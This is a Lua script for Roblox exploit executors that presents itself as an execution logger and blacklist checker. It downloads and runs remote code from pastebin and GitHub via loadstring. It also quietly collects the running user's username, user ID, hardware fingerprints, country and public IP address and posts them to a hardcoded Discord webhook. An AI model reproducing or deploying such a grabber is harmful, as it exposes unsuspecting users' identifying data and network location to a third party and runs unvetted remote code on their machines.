local Webhook = "https://discordapp.com/api/webhooks/1163737584120385616/K_4EbfUWmMYt62z8jtFso2wKKxqZ2ZE-1F_Ecr2siG6wy4ht658tykdNmyjVsehKrYO1" -- your webhook
_G.Discord_UserID = ''
local Request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local blacklist = loadstring(game:HttpGet("https://pastebin.com/raw/ms8MraRn"))()
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local player = game:GetService "Players".LocalPlayer
local joinTime = os.time() - (player.AccountAge * 86400)
local joinDate = os.date("!*t", joinTime)
local PlaceId, JobId = game.PlaceId, game.JobId
local dt = DateTime.now()
local premium = false
local alt = true
if player.MembershipType == Enum.MembershipType.Premium then
    premium = true
end
if not premium and player.AccountAge >= 70 then
    alt = "Possible"
elseif premium and player.AccountAge >= 70 then
    alt = false
end
function getplatform()
    if game:GetService("UserInputService").TouchEnabled == true then
        return "Mobile"
    elseif game:GetService("UserInputService").KeyboardEnabled == true then
        return "Pc"
    end
end
function getpremium()
    if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
        return "Yes"
    else
        return "No"
    end
end
function getexploithwid()
    local Body = game:GetService("HttpService"):JSONDecode(Request({
        Url = "https://httpbin.org/get",
        Method = "GET"
    }).Body)
    local Hwid
    for _, v in ipairs({"Krnl-Fingerprint", "Syn-Fingerprint", "SW-Fingerprint", "Flux-Fingerprint", "Oxy-Fingerprint", "Hydrogen-Fingerprint", "Delta-Fingerprint", "Electron-Fingerprint", "Kiwi-Fingerprint", "Vega-Fingerprint", "Valyse-Fingerprint", "Evon-Fingerprint", "Trigon-Fingerprint", "Articx-Fingerprint"}) do
        if Body.headers[v] then
            Hwid = Body.headers[v]
        end
    end
    return Hwid
end
function temp()
    local scripttime = game.Workspace.DistributedGameTime
    local seconds = scripttime % 60
    local minutes = math.floor(scripttime / 60 % 60)
    local hours = math.floor(scripttime / 3600)
    local tempo = string.format("%.0f:%.0f:%.0f", hours, minutes, seconds)
    return tempo
end
function exe()
    local decimals = 5
    local x = os.clock()
    local hwid2 = getexploithwid()
    for i, v in pairs(blacklist) do
        if v == hwid or v == hwid2 then
            game.Players.LocalPlayer:Kick("Blacklist")
            warn("Youre Blacklist From Our Script")
        else
            loadstring(game:HttpGet("https://raw.githubusercontent.com/airesz17890/Games/main/gameid.lua"))()
        end
    end
    local t = (string.format("%." .. tostring(decimals) .. "f\n", os.clock() - x))
    return t
end
function getbl()
    local hwid2 = getexploithwid()
    for i, v in pairs(blacklist) do
        if v == hwid or v == hwid2 then
            return "Yes"
        else
            return "No"
        end
    end
end
local LocalizationService = game:GetService("LocalizationService")
local CountryCodes = {
    AF = "Afghanistan",
    AX = "Åland Islands",
    AL = "Albania",
    DZ = "Algeria",
    AS = "American Samoa",
    AD = "Andorra",
    AO = "Angola",
    AI = "Anguilla",
    AQ = "Antarctica",
    AG = "Antigua and Barbuda",
    AR = "Argentina",
    AM = "Armenia",
    AW = "Aruba",
    AU = "Australia",
    AT = "Austria",
    AZ = "Azerbaijan",
    BS = "Bahamas",
    BH = "Bahrain",
    BD = "Bangladesh",
    BB = "Barbados",
    BY = "Belarus",
    BE = "Belgium",
    BZ = "Belize",
    BJ = "Benin",
    BM = "Bermuda",
    BT = "Bhutan",
    BO = "Bolivia",
    BA = "Bosnia and Herzegovina",
    BW = "Botswana",
    BV = "Bouvet Island",
    BR = "Brazil",
    IO = "British Indian Ocean Territory",
    BN = "Brunei Darussalam",
    BG = "Bulgaria",
    BF = "Burkina Faso",
    BI = "Burundi",
    KH = "Cambodia",
    CM = "Cameroon",
    CA = "Canada",
    CV = "Cape Verde",
    KY = "Cayman Islands",
    CF = "Central African Republic",
    TD = "Chad",
    CL = "Chile",
    CN = "China",
    CX = "Christmas Island",
    CC = "Cocos (Keeling) Islands",
    CO = "Colombia",
    KM = "Comoros",
    CG = "Congo",
    CD = "Congo, The Democratic Republic of The",
    CK = "Cook Islands",
    CR = "Costa Rica",
    CI = "Cote D'ivoire",
    HR = "Croatia",
    CU = "Cuba",
    CY = "Cyprus",
    CZ = "Czech Republic",
    DK = "Denmark",
    DJ = "Djibouti",
    DM = "Dominica",
    DO = "Dominican Republic",
    EC = "Ecuador",
    EG = "Egypt",
    SV = "El Salvador",
    GQ = "Equatorial Guinea",
    ER = "Eritrea",
    EE = "Estonia",
    ET = "Ethiopia",
    FK = "Falkland Islands (Malvinas)",
    FO = "Faroe Islands",
    FJ = "Fiji",
    FI = "Finland",
    FR = "France",
    GF = "French Guiana",
    PF = "French Polynesia",
    TF = "French Southern Territories",
    GA = "Gabon",
    GM = "Gambia",
    GE = "Georgia",
    DE = "Germany",
    GH = "Ghana",
    GI = "Gibraltar",
    GR = "Greece",
    GL = "Greenland",
    GD = "Grenada",
    GP = "Guadeloupe",
    GU = "Guam",
    GT = "Guatemala",
    GG = "Guernsey",
    GN = "Guinea",
    GW = "Guinea-bissau",
    GY = "Guyana",
    HT = "Haiti",
    HM = "Heard Island and Mcdonald Islands",
    VA = "Holy See (Vatican City State)",
    HN = "Honduras",
    HK = "Hong Kong",
    HU = "Hungary",
    IS = "Iceland",
    IN = "India",
    ID = "Indonesia",
    IR = "Iran, Islamic Republic of",
    IQ = "Iraq",
    IE = "Ireland",
    IM = "Isle of Man",
    IL = "Israel",
    IT = "Italy",
    JM = "Jamaica",
    JP = "Japan",
    JE = "Jersey",
    JO = "Jordan",
    KZ = "Kazakhstan",
    KE = "Kenya",
    KI = "Kiribati",
    KP = "Korea, Democratic People's Republic of",
    KR = "Korea, Republic of",
    KW = "Kuwait",
    KG = "Kyrgyzstan",
    LA = "Lao People's Democratic Republic",
    LV = "Latvia",
    LB = "Lebanon",
    LS = "Lesotho",
    LR = "Liberia",
    LY = "Libyan Arab Jamahiriya",
    LI = "Liechtenstein",
    LT = "Lithuania",
    LU = "Luxembourg",
    MO = "Macao",
    MK = "Macedonia, The Former Yugoslav Republic of",
    MG = "Madagascar",
    MW = "Malawi",
    MY = "Malaysia",
    MV = "Maldives",
    ML = "Mali",
    MT = "Malta",
    MH = "Marshall Islands",
    MQ = "Martinique",
    MR = "Mauritania",
    MU = "Mauritius",
    YT = "Mayotte",
    MX = "Mexico",
    FM = "Micronesia, Federated States of",
    MD = "Moldova, Republic of",
    MC = "Monaco",
    MN = "Mongolia",
    ME = "Montenegro",
    MS = "Montserrat",
    MA = "Morocco",
    MZ = "Mozambique",
    MM = "Myanmar",
    NA = "Namibia",
    NR = "Nauru",
    NP = "Nepal",
    NL = "Netherlands",
    AN = "Netherlands Antilles",
    NC = "New Caledonia",
    NZ = "New Zealand",
    NI = "Nicaragua",
    NE = "NigerAfrica",
    NG = "Nigeria",
    NU = "Niue",
    NF = "Norfolk Island",
    MP = "Northern Mariana Islands",
    NO = "Norway",
    OM = "Oman",
    PK = "Pakistan",
    PW = "Palau",
    PS = "Palestinian Territory, Occupied",
    PA = "Panama",
    PG = "Papua New Guinea",
    PY = "Paraguay",
    PE = "Peru",
    PH = "Philippines",
    PN = "Pitcairn",
    PL = "Poland",
    PT = "Portugal",
    PR = "Puerto Rico",
    QA = "Qatar",
    RE = "Reunion",
    RO = "Romania",
    RU = "Russian Federation",
    RW = "Rwanda",
    BL = "Saint Barthélemy",
    SH = "Saint Helena",
    KN = "Saint Kitts and Nevis",
    LC = "Saint Lucia",
    MF = "Saint Martin",
    PM = "Saint Pierre and Miquelon",
    VC = "Saint Vincent and The Grenadines",
    WS = "Samoa",
    SM = "San Marino",
    ST = "Sao Tome and Principe",
    SA = "Saudi Arabia",
    SN = "Senegal",
    RS = "Serbia",
    SC = "Seychelles",
    SL = "Sierra Leone",
    SG = "Singapore",
    SK = "Slovakia",
    SI = "Slovenia",
    SB = "Solomon Islands",
    SO = "Somalia",
    ZA = "South Africa",
    GS = "South Georgia and The South Sandwich Islands",
    ES = "Spain",
    LK = "Sri Lanka",
    SD = "Sudan",
    SR = "Suriname",
    SJ = "Svalbard and Jan Mayen",
    SZ = "Swaziland",
    SE = "Sweden",
    CH = "Switzerland",
    SY = "Syrian Arab Republic",
    TW = "Taiwan, Province of China",
    TJ = "Tajikistan",
    TZ = "Tanzania, United Republic of",
    TH = "Thailand",
    TL = "Timor-leste",
    TG = "Togo",
    TK = "Tokelau",
    TO = "Tonga",
    TT = "Trinidad and Tobago",
    TN = "Tunisia",
    TR = "Turkey",
    TM = "Turkmenistan",
    TC = "Turks and Caicos Islands",
    TV = "Tuvalu",
    UG = "Uganda",
    UA = "Ukraine",
    AE = "United Arab Emirates",
    GB = "United Kingdom",
    US = "United States",
    UM = "United States Minor Outlying Islands",
    UY = "Uruguay",
    UZ = "Uzbekistan",
    VU = "Vanuatu",
    VE = "Venezuela",
    VN = "Viet Nam",
    VG = "Virgin Islands, British",
    VI = "Virgin Islands, U.S.",
    WF = "Wallis and Futuna",
    EH = "Western Sahara",
    YE = "Yemen",
    ZM = "Zambia",
    ZW = "Zimbabwe"
}
function getcountry()
    local function getCountryName(code)
        return CountryCodes[code] or "Unknown"
    end
    local success, code = pcall(LocalizationService.GetCountryRegionForPlayerAsync, LocalizationService, game.Players.LocalPlayer)
    if success and code then
        return getCountryName(code)
    else
        return success, code
    end
end
local executor = identifyexecutor() or "Unknown"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl
local msg = {
    ["username"] = "Executor Bot",
    ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
    ["content"] = (_G.Discord_UserID ~= "" and _G.Discord_UserID ~= nil) and tostring("@" .. _G.Discord_UserID .. "") or " ",
    ["embeds"] = {
        {
            ["color"] = tonumber(tostring("0x32CD32")),
            ["title"] = "Your Script Has Been Executed!",
            ["thumbnail"] = {
                ["url"] = AvatarImage,
            },
            ["fields"] = {
                {
                    ["name"] = "**Username**",
                    ["value"] = player.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "**Display Name**",
                    ["value"] = player.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "**UserId**",
                    ["value"] = "[" .. player.UserId .. "](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile") .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "**CharAppearance**",
                    ["value"] = player.CharacterAppearanceId,
                    ["inline"] = true
                },
                {
                    ["name"] = "**Game Id**",
                    ["value"] = "[" .. game.PlaceId .. "](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "**Game Name**",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "**Executor Used**",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "**Alt**",
                    ["value"] = alt,
                    ["inline"] = true
                },
                {
                    ["name"] = "**Account Age**",
                    ["value"] = player.AccountAge .. "day(s)",
                    ["inline"] = true
                },
                {
                    ["name"] = "**Date Joined**",
                    ["value"] = joinDate.day .. "/" .. joinDate.month .. "/" .. joinDate.year,
                    ["inline"] = true
                },
                {
                    ["name"] = "**Job Id**",
                    ["value"] = JobId,
                    ["inline"] = true
                },
                {
                    ["name"] = "**User Country**",
                    ["value"] = getcountry(),
                    ["inline"] = true
                },
                {
                    ["name"] = "**User Platform**",
                    ["value"] = getplatform(),
                    ["inline"] = true
                },
                {
                    ["name"] = "**User Time**",
                    ["value"] = dt:FormatLocalTime("LT", "en-us"),
                    ["inline"] = true
                },
                {
                    ["name"] = "**User Premium**",
                    ["value"] = getpremium(),
                    ["inline"] = true
                },
                {
                    ["name"] = "**Game Loaded**",
                    ["value"] = game:IsLoaded(),
                    ["inline"] = true
                },
                {
                    ["name"] = "**Loaded Time**",
                    ["value"] = exe() .. "Second",
                    ["inline"] = true
                },
                {
                    ["name"] = "**In Game Time**",
                    ["value"] = temp(),
                    ["inline"] = true
                },
                {
                    ["name"] = "**Roblox Hwid**",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true
                },
                {
                    ["name"] = "**ip address**",
                    ["value"] = game:HttpGet("https://api.ipify.org", true),
                    ["inline"] = true
                },
                {
                    ["name"] = "**Place Version**",
                    ["value"] = game.PlaceVersion,
                    ["inline"] = true
                },
                {
                    ["name"] = "**Blacklist**",
                    ["value"] = getbl(),
                    ["inline"] = true
                },
                {
                    ["name"] = "**Exploit Hwid**",
                    ["value"] = getexploithwid(),
                    ["inline"] = true
                }
            },
        }
    }
}
request = http_request or request or HttpPost or syn.request
request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
